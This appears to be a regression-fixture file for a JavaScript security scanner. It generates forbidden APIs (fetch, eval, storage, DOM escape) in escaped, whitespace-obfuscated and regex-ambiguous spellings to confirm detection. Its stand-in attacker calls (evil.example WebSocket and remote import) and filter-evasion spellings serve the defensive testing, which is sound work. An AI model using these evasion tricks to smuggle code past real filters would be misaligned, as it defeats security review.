// Regression fixtures for the scanner's NORMALISATION CONTRACT (decision D17; see the top of the lexer in lib/design-scan.mjs):
// identifier and property names are compared by their escape-decoded value, string and template literals by their cooked value,
// whatever the spelling (escapes, exotic whitespace, line terminators, comments, number and regex look-alikes). Every forbidden
// construct is generated in its plain spelling AND in several escaped spellings, all expecting the SAME rule id; the negative cases at
// the end prove legitimate code with escapes, odd whitespace or look-alike syntax is still accepted.
// Escapes are produced by helpers (escapes.mjs), never typed, so no tool can turn them into the real characters.
import { BS, LS, PS, NBSP, BOM, ZWJ, idEsc, uEsc, strEsc } from "./escapes.mjs";

const view = (body) => `export default function view(root, ctx) { ${body} }`;
const aview = (body) => `export default async function view(root, ctx) { ${body} }`;
const FI = "js/forbidden-identifier";

// [name, rule, source(X)] where X is the spelling of the identifier under test
export const IDENT_CONSTRUCTS = [
  // network and messaging
  ["fetch", FI, (X) => `${X}("/api/v1/admin/me");`],
  ["XMLHttpRequest", FI, (X) => `const r = new ${X}();`],
  ["WebSocket", FI, (X) => `new ${X}("wss://evil.example/x");`],
  ["EventSource", FI, (X) => `new ${X}("/s");`],
  ["sendBeacon", FI, (X) => `ctx.x.${X}("/x", "d");`],
  ["postMessage", FI, (X) => `ctx.x.${X}("m", "*");`],
  ["Worker", FI, (X) => `new ${X}("/w.js");`],
  ["BroadcastChannel", FI, (X) => `new ${X}("c");`],
  ["importScripts", FI, (X) => `${X}("/x.js");`],
  // storage
  ["localStorage", FI, (X) => `${X}.setItem("a", "b");`],
  ["sessionStorage", FI, (X) => `${X}.getItem("admin.refresh");`],
  ["indexedDB", FI, (X) => `${X}.open("x");`],
  ["caches", FI, (X) => `${X}.open("x");`],
  ["cookie", FI, (X) => `const c = ctx.x.${X};`],
  ["cookieStore", FI, (X) => `${X}.get("a");`],
  // dynamic code
  ["eval", FI, (X) => `${X}("1+1");`],
  ["Function", FI, (X) => `const f = new ${X}("return 1");`],
  ["constructor", FI, (X) => `const F = ctx.ui.h.${X};`],
  ["__proto__", FI, (X) => `const p = ctx.x.${X};`],
  ["Reflect", FI, (X) => `${X}.get({}, "a");`],
  ["Proxy", FI, (X) => `new ${X}({}, {});`],
  ["WebAssembly", FI, (X) => `${X}.compile(1);`],
  // ambient globals
  ["window", FI, (X) => `${X}.alert(1);`],
  ["document", FI, (X) => `${X}.body;`],
  ["globalThis", FI, (X) => `${X}.x;`],
  ["navigator", FI, (X) => `${X}.sendBeacon;`],
  ["location", FI, (X) => `${X}.href = "/x";`],
  ["self", FI, (X) => `${X}.x;`],
  ["top", FI, (X) => `${X}.x;`],
  ["parent", FI, (X) => `${X}.x;`],
  // raw HTML and element factories
  ["innerHTML", FI, (X) => `root.${X} = "x";`],
  ["outerHTML", FI, (X) => `root.${X} = "x";`],
  ["createElement", FI, (X) => `ctx.x.${X}("a");`],
  ["setAttribute", FI, (X) => `root.${X}("a", "b");`],
  ["insertAdjacentHTML", FI, (X) => `root.${X}("beforeend", "x");`],
  ["attachShadow", FI, (X) => `root.${X}({ mode: "open" });`],
  ["srcdoc", FI, (X) => `const o = { ${X}: "x" };`],
  ["Image", FI, (X) => `new ${X}().src = "/x";`],
  ["FormData", FI, (X) => `new ${X}();`],
  // dialogs, popovers, fullscreen (D12 item 1)
  ["showModal", "js/dialog-api", (X) => `root.${X}();`],
  ["showPopover", "js/dialog-api", (X) => `root.${X}();`],
  ["requestFullscreen", "js/dialog-api", (X) => `root.${X}();`],
  ["requestPointerLock", "js/dialog-api", (X) => `root.${X}();`],
  ["show", "js/dialog-api", (X) => `root.${X}();`],
  ["close", "js/dialog-api", (X) => `root.${X}();`],
  ["popover", "js/popover-inert", (X) => `ctx.ui.h("div", { ${X}: "auto" });`],
  ["inert", "js/popover-inert", (X) => `root.${X} = true;`],
  ["popoverTargetElement", "js/popover-inert", (X) => `root.${X} = root;`],
  // synthetic input (D12 item 2)
  ["dispatchEvent", "js/synthetic-input", (X) => `root.${X}(1);`],
  ["requestSubmit", "js/synthetic-input", (X) => `root.${X}();`],
  ["Event", "js/synthetic-input", (X) => `new ${X}("click");`],
  ["CustomEvent", "js/synthetic-input", (X) => `new ${X}("x");`],
  ["MouseEvent", "js/synthetic-input", (X) => `new ${X}("click");`],
  ["click", "js/synthetic-input", (X) => `root.${X}();`],
  ["submit", "js/synthetic-input", (X) => `root.${X}();`],
  // DOM traversal (D12 item 3)
  ["parentNode", "js/dom-escape", (X) => `root.${X}.x;`],
  ["ownerDocument", "js/dom-escape", (X) => `root.${X};`],
  ["getRootNode", "js/dom-escape", (X) => `root.${X}();`],
  ["firstChild", "js/dom-escape", (X) => `root.${X};`],
  ["getElementById", "js/dom-escape", (X) => `root.${X}("x");`],
  ["closest", "js/dom-escape", (X) => `root.${X}(".x");`],
  ["view", "js/dom-escape", (X) => `root.${X}.x;`],
  ["querySelector", "js/dom-escape", (X) => `root.x.${X}(".x");`],
  ["$", "js/dom-escape", (X) => `${X}(".x");`],
  ["$$", "js/dom-escape", (X) => `${X}(".x");`],
  // misc rules that read an identifier
  ["onclick", "js/event-handler-assignment", (X) => `const b = ctx.ui.h("button"); b.${X} = () => 1;`],
  ["onclick", "js/event-handler-string", (X) => `ctx.ui.h("b", { ${X}: "alert(1)" });`],
  ["setTimeout", "js/timer-string", (X) => `${X}("alert(1)", 1);`],
  ["action", "js/form-action", (X) => `ctx.ui.h("form", { ${X}: "/x" });`],
  // ctx may not be shadowed, assigned or enumerated
  ["ctx", "js/ctx-shadow", (X) => `const ${X} = 1;`],
  ["ctx", "js/ctx-shadow", (X) => `${X} = {};`],
  ["ctx", "js/ctx-shadow", (X) => `${X} &&= {};`],
  ["ctx", "js/ctx-shadow", (X) => `const f = ${X} => 1;`],
  ["ctx", "js/ctx-shadow", (X) => `const g = function (${X}) { return 1; };`],
  ["ctx", "js/ctx-unknown", (X) => `const o = { ...${X} };`],
  ["ctx", "js/ctx-unknown", (X) => `${X}.noSuchFunction();`],
  ["noSuchFunction", "js/ctx-unknown", (X) => `ctx.${X}();`],
  ["ui", "js/ctx-unknown", (X) => `const { ${X}: u } = ctx; u.noSuchBuilder();`],
  ["Object", "js/ctx-unknown", (X) => `${X}.values(ctx);`],
];

/** The spellings of an identifier: plain, one char escaped, every char escaped, every other char escaped, braces. */
const identSpellings = (name) => {
  const out = [["plain", name]];
  if ([...name].length > 1) out.push(["escaped first", idEsc(name, "first")], ["escaped last", idEsc(name, "last")], ["escaped every other", idEsc(name, "mid")]);
  out.push(["all escaped", idEsc(name, "all")], ["all escaped with braces", idEsc(name, "all", true)]);
  return out;
};

export const ESCAPED_CASES = [];
for (const [name, rule, build] of IDENT_CONSTRUCTS) {
  for (const [how, spelling] of identSpellings(name)) {
    ESCAPED_CASES.push({ name: `D17 ident ${name} -> ${rule} (${how})`, kind: "code", expect: rule, src: view(build(spelling)) });
  }
}
// a keyword import spelled with an escape is a SyntaxError in JavaScript; the scanner still reports it (it reads the canonical name)
for (const [how, spelling] of identSpellings("import")) ESCAPED_CASES.push({ name: `D17 ident import() -> js/dynamic-import (${how})`, kind: "code", expect: "js/dynamic-import", src: aview(`const m = await ${spelling}("../parts/x.js");`) });
ESCAPED_CASES.push({ name: "D17 import.meta with an escaped meta", kind: "code", expect: FI, src: view(`const u = import.${idEsc("meta", "first")}.url;`) });

// ── string and template values: cooked, then compared whole ──
const STR_NAMES = [["fetch", "js/banned-string"], ["eval", "js/banned-string"], ["constructor", "js/banned-string"], ["localStorage", "js/banned-string"], ["window", "js/banned-string"], ["innerHTML", "js/banned-string"], ["iframe", "js/banned-string"], ["prototype", "js/banned-string"],
  ["showModal", "js/dom-escape"], ["querySelector", "js/dom-escape"], ["dispatchEvent", "js/dom-escape"], ["closest", "js/dom-escape"], ["getRootNode", "js/dom-escape"], ["showDialog", "js/dom-escape"],
  ["popover", "js/dialog-element"], ["inert", "js/dialog-element"]];
for (const [word, rule] of STR_NAMES) {
  for (const kind of ["x", "u", "brace", "octal", "mixed"]) {
    for (const q of ['"', "'"]) ESCAPED_CASES.push({ name: `D17 string "${word}" -> ${rule} (${kind}, ${q})`, kind: "code", expect: rule, src: view(`const n = ${q}${strEsc(word, kind)}${q};`) });
  }
  ESCAPED_CASES.push({ name: `D17 string "${word}" -> ${rule} (one char escaped, as an argument)`, kind: "code", expect: rule, src: view(`ctx.ui.h("${strEsc(word, "x", "first")}");`) });
}
ESCAPED_CASES.push({ name: "D17 h(dialog) with an escaped string", kind: "code", expect: "js/dialog-element", src: view(`ctx.ui.h("${strEsc("dialog", "u", "mid")}");`) });
ESCAPED_CASES.push({ name: "D17 string with a line continuation inside the word", kind: "code", expect: "js/banned-string", src: view(`const n = "fe${BS}\ntch";`) });
ESCAPED_CASES.push({ name: "D17 string with a CRLF line continuation inside the word", kind: "code", expect: "js/banned-string", src: view(`const n = "fe${BS}\r\ntch";`) });
for (const kind of ["x", "u", "brace", "octal"]) {
  ESCAPED_CASES.push({ name: `D17 core confirm id in a string (${kind})`, kind: "code", expect: "js/core-ui-selector", src: view(`const s = "${strEsc("confirm-yes", kind, "mid")}";`) });
  ESCAPED_CASES.push({ name: `D17 core confirm id in a template (${kind})`, kind: "code", expect: "js/core-ui-selector", src: view(`const s = \`#${strEsc("confirm-warning", kind, "mid")}\`;`) });
  ESCAPED_CASES.push({ name: `D17 core confirm id in a selector string (${kind})`, kind: "code", expect: "js/core-ui-selector", src: view(`const s = "[data-testid=${strEsc("confirm-cancel", kind, "first")}]";`) });
  ESCAPED_CASES.push({ name: `D17 markup in a string (${kind})`, kind: "code", expect: "js/html-or-url-in-string", src: view(`ctx.ui.h("div", {}, "${strEsc("<script>", kind, "all")}");`) });
  ESCAPED_CASES.push({ name: `D17 markup in a template (${kind})`, kind: "code", expect: "js/html-or-url-in-string", src: view(`const s = \`${strEsc("<iframe src=x>", kind, "mid")}\`;`) });
  ESCAPED_CASES.push({ name: `D17 script scheme in a string (${kind})`, kind: "code", expect: "js/html-or-url-in-string", src: view(`const s = "${strEsc("javascript:alert(1)", kind, "mid")}";`) });
  ESCAPED_CASES.push({ name: `D17 external URL in a string (${kind})`, kind: "code", expect: "js/html-or-url-in-string", src: view(`const s = "https${strEsc("://", kind, "all")}evil.example/x";`) });
  ESCAPED_CASES.push({ name: `D17 dialog tag in a template (${kind})`, kind: "code", expect: "js/dialog-element", src: view(`const s = \`<${strEsc("dialog", kind, "mid")}>\`;`) });
  ESCAPED_CASES.push({ name: `D17 string event handler key (${kind})`, kind: "code", expect: "js/event-handler-string", src: view(`ctx.ui.h("b", { "${strEsc("onclick", kind, "mid")}": "alert(1)" });`) });
  ESCAPED_CASES.push({ name: `D17 computed ["click"] (${kind})`, kind: "code", expect: "js/synthetic-input", src: view(`root["${strEsc("click", kind, "mid")}"]();`) });
  ESCAPED_CASES.push({ name: `D17 computed ["submit"] (${kind})`, kind: "code", expect: "js/synthetic-input", src: view(`root["${strEsc("submit", kind, "all")}"]();`) });
  ESCAPED_CASES.push({ name: `D17 import of a remote URL written with escapes (${kind})`, kind: "code", expect: "js/import", src: `import x from "${strEsc("https://evil.example/x.js", kind, "mid")}";\nexport default function view(root, ctx) {}` });
  ESCAPED_CASES.push({ name: `D17 import that leaves design/ written with escapes (${kind})`, kind: "code", expect: "js/import", src: `import x from "${strEsc("../../lib/api.js", kind, "mid")}";\nexport default function view(root, ctx) {}` });
}

// ── exotic whitespace, line terminators, comments, parentheses, optional chaining around a forbidden name ──
const FETCH = "fetch";
const SEPARATED = [
  ["U+2028 after a line comment", `// note${LS} fetch("/x");`],
  ["U+2029 after a line comment", `// note${PS} fetch("/x");`],
  ["CR (no LF) after a line comment", `// note\r fetch("/x");`],
  ["CRLF after a line comment", `// note\r\n fetch("/x");`],
  ["comment containing a quote then code", `// it's\n fetch("/x");`],
  ["block comment between the name and the call", `fetch /* c */ ("/x");`],
  ["block comment holding line separators", `/* a${LS}b${PS}c */ fetch("/x");`],
  ["no-break space before the call", `fetch${NBSP}("/x");`],
  ["BOM in front", `${BOM}fetch("/x");`],
  ["U+2028 before the call", `fetch${LS}("/x");`],
  ["vertical tab and form feed", `fetch\v\f("/x");`],
  ["U+2028 between receiver and property", `ctx.x.${LS}fetch("/x");`],
  ["newline between receiver and property", `ctx.x\n  .fetch("/x");`],
  ["optional chaining", `ctx.x?.fetch?.("/x");`],
  ["optional chaining with spaces and comments", `ctx.x ?. /* c */ fetch ?. ("/x");`],
  ["optional chaining with a string key", `ctx.x?.["fetch"]("/x");`, "js/banned-string"],
  ["parenthesised", `((fetch))("/x");`],
  ["comma expression", `(0, fetch)("/x");`],
  ["bracket string key", `ctx.x["fetch"]("/x");`, "js/banned-string"],
  ["template-literal key (a computed access)", "ctx.x[`fetch`](\"/x\");", "js/computed-access"],
  ["computed key in an object literal", `const o = { ["fetch"]: 1 };`, "js/banned-string"],
  ["getter name", `const o = { get fetch() { return 1; } };`],
  ["class method name", `class A { fetch() {} }`],
  ["class private name next to it", `class A { #p = 1; m() { return this.#p; } } fetch("/x");`],
  ["after a nested template literal", "const t = `a${`b${1}`}c`; fetch(\"/x\");"],
  ["inside a nested template literal", "const t = `a${`b${fetch(\"/x\")}`}c`;"],
  ["after a template with a closing brace in a string", "const t = `a${\"}\"}b`; fetch(\"/x\");"],
  ["after numbers with separators", `const n = 1_000 + 0x1F_F + 1e3 + .5; fetch("/x");`],
  ["after a hashbang-looking line that is not first", `const a = 1;\n#!fetch\n`],
  ["after an HTML-like comment opener (not a comment in a module)", `const a = 1; <!-- note\n fetch("/x");`],
  ["inside an HTML-like comment close", `const a = 1;\n--> fetch("/x");`],
  ["after a regex that holds slashes in a class", `const r = /[//]/; fetch("/x");`],
  ["after a regex that holds an escaped slash", `const r = /${BS}//; fetch("/x");`],
  ["after a regex holding a quote (statement position)", `if (root) /'/.test("x"); fetch("/x");`],
  ["after a regex holding a double quote (while)", `while (0) /"/.test("x"); fetch("/x");`],
  ["after a regex holding a backtick (for)", "for (;0;) /`/.test(\"x\"); fetch(\"/x\");"],
  ["after a regex holding a quote after a block", `function f() {}\n/'/.test("x"); fetch("/x");`],
  ["after a regex holding a quote after an if block", `if (root) { root.a(); }\n/'/.test("x"); fetch("/x");`],
  ["after a division", `const q = root.a / 2 / 3; fetch("/x");`],
  ["after a division of a call", `const q = root.a() / 2 / 3; fetch("/x");`],
  ["after a division by an object literal result", `const q = {} / 2; fetch("/x");`],
  ["after a division following a postfix increment", `let i = 0; const q = i++ / 2 / 3; fetch("/x");`],
  ["after a property named like a keyword then a division", `const q = root.in / 2 / 3; fetch("/x");`],
  ["after a division of a function expression", `const q = function () {} / 2; fetch("/x");`],
  ["number then dot (1..constructor)", `const F = 1..constructor.constructor;`],
  ["decimal then dot (1.5.constructor)", `const F = 1.5.constructor.constructor;`],
  ["hex then dot", `const F = 0x10.constructor;`],
  ["exponent then dot", `const F = 1e3.constructor;`],
  ["bigint then dot", `const F = 10n.constructor;`],
  ["separator number then dot", `const F = 1_0..constructor;`],
  ["number with a space then dot", `const F = 5 .constructor;`],
  ["a?.5:b is a ternary, fetch follows", `const q = root.a?.5:1; fetch("/x");`],
];
for (const [how, body, rule = FI] of SEPARATED) {
  ESCAPED_CASES.push({ name: `D17 forbidden name: ${how}`, kind: "code", expect: rule, src: view(body) });
  if (/fetch/.test(body)) ESCAPED_CASES.push({ name: `D17 forbidden name, escaped: ${how}`, kind: "code", expect: rule, src: view(body.replaceAll(FETCH, idEsc(FETCH, "mid"))) });
}
// ── review round 2: ambiguous "/" and "}" places. Each of these is VALID JavaScript in which the "/" is a division or a regex; a quote or a
// slash on the same line must not make the scanner lose sight of the fetch call. They must be reported whichever way the "/" reads. ──
const AMBIGUOUS = [
  ["of as a variable, then a division", `const of = 4; of / fetch("x") / 3;`],
  ["of before a regex in for-of", `for (const x of /'/g.exec(y)) { fetch("x"); const q = '/'; }`],
  ["arrow function body then a line break then a regex", `const f = () => {}\n/'/.test(1); fetch('x'); const q = '/';`],
  ["arrow function body then a division", `const f = () => {} / 2 / fetch("x") / 3;`],
  ["yield before a regex in a generator", `function* g() { yield /'/.test(1); fetch('x'); const q = '/'; }`],
  ["yield as a variable, then a division", `var yield_ = 1; function g() { var yield = 2; return yield / fetch("x") / 3; }`],
  ["await before a regex in an async function", `async function g() { await /'/.test(1); fetch('x'); const q = '/'; }`],
  ["await as a variable, then a division", `function g() { var await = 2; return await / fetch("x") / 3; }`],
  ["let as a variable, then a division", `var let = 2; let / fetch("x") / 3;`],
  ["get, set, async, static as variables, then divisions", `var get = 1, set = 2, async = 3, stat = 4; get / fetch("x") / 2; set / fetch("x") / 2; async / fetch("x") / 2;`],
  ["a block statement then a regex", `if (root) { root.a(); }\n/'/.test(1); fetch('x'); const q = '/';`],
  ["a bare block then a regex", `{ root.a(); }\n/'/.test(1); fetch('x'); const q = '/';`],
  ["a function declaration then a regex", `function f() {}\n/'/.test(1); fetch('x'); const q = '/';`],
  ["a function expression then a division", `const g = function () {} / 2 / fetch("x") / 3;`],
  ["a class declaration then a regex", `class A {}\n/'/.test(1); fetch('x'); const q = '/';`],
  ["a class expression then a division", `const C = class {} / 2 / fetch("x") / 3;`],
  ["an object literal then a division", `const o = {} / 2 / fetch("x") / 3;`],
  ["an object literal in a ternary then a regex-looking line", `const o = root ? {} : {}\n/'/.test(1); fetch('x'); const q = '/';`],
  ["a label block then a regex", `lbl: { root.a(); }\n/'/.test(1); fetch('x'); const q = '/';`],
  ["a case block then a regex", `switch (root.a) { case 1: { root.b(); }\n/'/.test(1); fetch('x'); const q = '/'; }`],
  ["an if condition then a regex", `if (root) /'/.test(1); fetch('x'); const q = '/';`],
  ["a while condition then a regex", `while (0) /'/.test(1); fetch('x'); const q = '/';`],
  ["a for header then a regex", `for (;0;) /'/.test(1); fetch('x'); const q = '/';`],
  ["a call then a division", `root.f(1) / 2 / fetch("x") / 3;`],
  ["a call named like a statement on a property", `root.if(1) / 2 / fetch("x") / 3;`],
  ["a postfix increment then a division", `let i = 1; i++ / 2 / fetch("x") / 3;`],
  ["a prefix increment on the next line then a regex", `let i = 1; i\n++\n/'/.lastIndex; fetch('x'); const q = '/';`],
  ["a regex inside a template expression", "const t = `${/'/.test(1)}`; fetch('x'); const q = '/';"],
  ["nested ambiguity: of then arrow then block", `const of = 1; const f = () => {}\n/'/.test(1); of / fetch("x") / 3; const q = '/';`],
];
for (const [how, body] of AMBIGUOUS) ESCAPED_CASES.push({ name: `D17 ambiguous slash: ${how}`, kind: "code", expect: FI, src: view(body) }, { name: `D17 ambiguous slash, escaped name: ${how}`, kind: "code", expect: FI, src: view(body.replaceAll(FETCH, idEsc(FETCH, "mid"))) });
// ── review round 3: a file with more than MAX_AMBIGUOUS_SLASHES (4) ambiguous slash places is REPORTED (js/ambiguous-slash), never sampled;
// up to 4 are enumerated in full (every mixed reading). The padded case is the one a sampled reading set missed from 23 places on. ──
const padded = (N) => view("const of = 4; const f = () => {}\n/'/.test(1); " + "of / 2; ".repeat(N) + "of / fetch('x') / 3; const q = '/';");
for (const N of [0, 1, 2]) ESCAPED_CASES.push({ name: "D17 ambiguous slashes: padded with " + N + " (every reading enumerated)", kind: "code", expect: FI, src: padded(N) });
for (const N of [3, 4, 22, 23, 24, 100, 1000]) ESCAPED_CASES.push({ name: "D17 ambiguous slashes: padded with " + N + " is refused", kind: "code", expect: "js/ambiguous-slash", src: padded(N) });
ESCAPED_CASES.push(
  { name: "D17 mixed reading: arrow is a regex, of is a division", kind: "code", expect: FI, src: view("const of = 4; const f = () => {}\n/'/.test(1); of / fetch('x') / 3; const q = '/';") },
  { name: "D17 mixed reading: arrow is a division, of is a regex", kind: "code", expect: FI, src: view("const f = () => {} / 'x'; for (const z of /'/.test(1)) { fetch('x'); const q = '/'; }") },
  { name: "D17 mixed reading: yield regex then arrow division", kind: "code", expect: FI, src: view("function* g() { yield /'/.test(1); } const f = () => {} / 2 / fetch('x') / 3;") },
  { name: "D17 mixed reading: block regex, then of division, then arrow regex", kind: "code", expect: FI, src: view("const of = 1; if (root) { root.a(); }\n/'/.test(1); of / 2 / fetch('x') / 3; const f = () => {}\n/'/.test(2); const q = '/';") },
);
// a regex literal of ANY length is a regex: its quotes are not strings (no length cap)
for (const L of [1200, 5000, 100000]) {
  ESCAPED_CASES.push({ name: "D17 long regex (" + L + " chars) with a quote, a slash in a class and code after it", kind: "code", expect: FI, src: view("const r = /[/']" + "a".repeat(L) + "'/.test(1); fetch('x'); const q = '/';") });
  ESCAPED_CASES.push({ name: "D17 long regex (" + L + " chars) after a statement paren", kind: "code", expect: FI, src: view("if (root) /[/'\\]]" + "b".repeat(L) + "'/.test(1); fetch('x'); const q = '/';") });
  ESCAPED_CASES.push({ name: "D17 valid: long regex (" + L + " chars) alone", kind: "code", expect: null, src: view("const r = /[/']" + "a".repeat(L) + "'/.test(root.a); return r;") });
}
// ctx may not be shadowed through any binding form
for (const [how, body] of [
  ["catch parameter", `try { root.a(); } catch (ctx) { root.b(); }`], ["array pattern", `const [ctx] = root.a;`], ["object pattern", `const { ctx } = root.a;`], ["renaming pattern", `const { a: ctx } = root.a;`],
  ["nested pattern", `const { a: { ctx } } = root.a;`], ["array assignment", `[ctx] = root.a;`], ["object assignment", `({ ctx } = root.a);`], ["postfix increment", `ctx++;`], ["prefix decrement", `--ctx;`],
  ["for-of variable", `for (ctx of root.a) {}`], ["for-of pattern", `for (const [ctx] of root.a) {}`], ["import as", `import { x as ctx } from "./a.js";`], ["default import", `import ctx from "./a.js";`],
]) ESCAPED_CASES.push({ name: `D17 ctx shadow: ${how}`, kind: "code", expect: "js/ctx-shadow", src: view(body) }, { name: `D17 ctx shadow, escaped: ${how}`, kind: "code", expect: "js/ctx-shadow", src: view(body.replace("ctx", idEsc("ctx", "mid"))) });

// computed access hidden behind "?.[" or after a number, regex or object literal
for (const [how, body] of [
  ["?.[ with a call", `root?.[ctx.t("a")]; `], ["?.[ with a sum of calls", `root?.[a() + b()];`], ["[ after an object literal", `const v = { a: 1 }[a() + b()];`],
  ["[ after a number", `const v = 5[a() + b()];`], ["[ after a closed template", "const v = `a`[a() + b()];"], ["[ after a regex", `const v = /a/[a() + b()];`],
]) ESCAPED_CASES.push({ name: `D17 computed access: ${how}`, kind: "code", expect: "js/computed-access", src: view(body) });
// a compound assignment is an assignment
for (const op of ["+=", "-=", "**=", "<<=", ">>=", ">>>=", "&=", "|=", "^=", "&&=", "||=", "??="]) ESCAPED_CASES.push({ name: `D17 ctx ${op} is an assignment`, kind: "code", expect: "js/ctx-shadow", src: view(`ctx ${op} {};`) });
// data files: escapes cannot smuggle an identifier past the "literals only" rule
ESCAPED_CASES.push({ name: "D17 data file: escaped identifier is still an identifier", kind: "data", expect: "js/data-not-pure", src: `export default { a: ${idEsc("fetch", "first")} };` });
ESCAPED_CASES.push({ name: "D17 data file: unterminated string does not pass", kind: "data", expect: "js/data-not-pure", src: `export default { a: "x\n  b: fetch("y") };` });

// ── negative cases: legitimate code must still be accepted ──
const OK = (name, src, kind = "code") => ESCAPED_CASES.push({ name: `D17 valid: ${name}`, kind, expect: null, src });
OK("an escaped identifier that is not forbidden", view(`const ${idEsc("total", "mid")} = 1; return total;`));
OK("a variable whose name only contains a forbidden word", view(`const fetchCount = 1, myWindow = 2, documentTitle = 3; return fetchCount + myWindow + documentTitle;`));
OK("an escaped name that decodes to something else", view(`const ${idEsc("fetchy", "all")} = 1; return fetchy;`));
OK("a string that only contains a forbidden word", view(`const s = "${strEsc("please fetch the window", "u", "mid")}";`));
OK("a string with a harmless escape and a line continuation", view(`const s = "a${BS}n${BS}x41${BS}\nb${BS}0";`));
OK("an octal escape that does not spell a forbidden word", view(`const s = "${BS}101${BS}102${BS}08";`));
OK("a template with escapes and expressions", view(["const t = `${1} ", BS, "x41 ", BS, "u{42} ", BS, "${ ${", '"x"', "}`;"].join("")));
OK("nested templates", view("const t = `a${`b${`c`}`}d`; return t;"));
OK("regex with slashes in a class and an escaped slash", view(`const r = /[//]${BS}//g; return r.test("/");`));
OK("division chains", view(`const q = root.a / 2 / 3; const r = (1 + 2) / 3 / 4; return q / r / 5;`));
OK("a regex after return, after an if (...) and after a block", view(`if (root) /x/.test("y"); function f() { return /a${BS}/b/.test("a/b"); }\n/z/.test("z"); return f;`));
OK("number forms", view(`return [1_000, 0x1F, 0b11, 0o7, 1e3, 1e-3, .5, 5., 1.5, 10n, 1..toString(), 1.5.toFixed(2), (1).toFixed(1), 5 .toFixed(1)];`));
OK("optional chaining forms", view(`const a = root?.b?.[0]?.(1); const t = root.c?.5:1; return a + t;`));
OK("class with private names and a static block", view(`class A { #p = 1; static { A.q = 2; } get p() { return this.#p; } } return A;`));
OK("unicode identifiers and a zero-width joiner", view(`const caf${String.fromCharCode(0xe9)} = 1, ${String.fromCharCode(0x53d8)}${String.fromCharCode(0x91cf)} = 2, a${ZWJ}b = 3; return caf${String.fromCharCode(0xe9)} + ${String.fromCharCode(0x53d8)}${String.fromCharCode(0x91cf)} + a${ZWJ}b;`));
OK("a forbidden word in comments, with line separators", view(`// fetch and window${LS} const a = 1; /* eval( */ return a; // innerHTML`));
OK("exotic whitespace between tokens", view(`const${NBSP}a${LS}=${PS}1;${BOM}return a;`));
OK("ctx read in patterns and literals is not a shadow", view(`const { t, can } = ctx; const o = { ctx }; const [a, b] = [ctx, 1]; const { x = ctx } = root.a; return [o, a, b, x, t, can];`));
OK("a catch parameter with another name, for-of with another name", view(`try { root.a(); } catch (err) { root.b(err); } for (const item of root.items) root.c(item); for (const [k, v] of Object.entries(root.o)) root.d(k, v);`));
OK("a division after of, let, get used as names is still fine code", view(`const of = 4, get = 2; return of / 2 / get;`));
OK("an arrow body then a normal statement", view(`const f = () => { root.a(); }\nconst g = f;\nreturn g;`));
OK("a hashbang first line", `#!/usr/bin/env node\nexport default function view(root, ctx) { return 1; }`);
OK("an escaped relative import that stays under design/", `import { helper } from "${strEsc("../parts/helper.js", "u", "mid")}";\nexport default function view(root, ctx) { return helper; }`);
OK("ctx used normally with an escaped property name that is allowed", view(`const { ${idEsc("ui", "first")} } = ctx; return ${idEsc("ctx", "last")}.t("a");`));
OK("the word dialog as an ARIA value", view(`ctx.ui.h("div", { role: "${strEsc("dialog", "u", "mid")}" });`));
OK("data file with an escape in a string value", `export default {\n  "a.b": "${strEsc("caf", "u", "all")}",\n};`, "data");
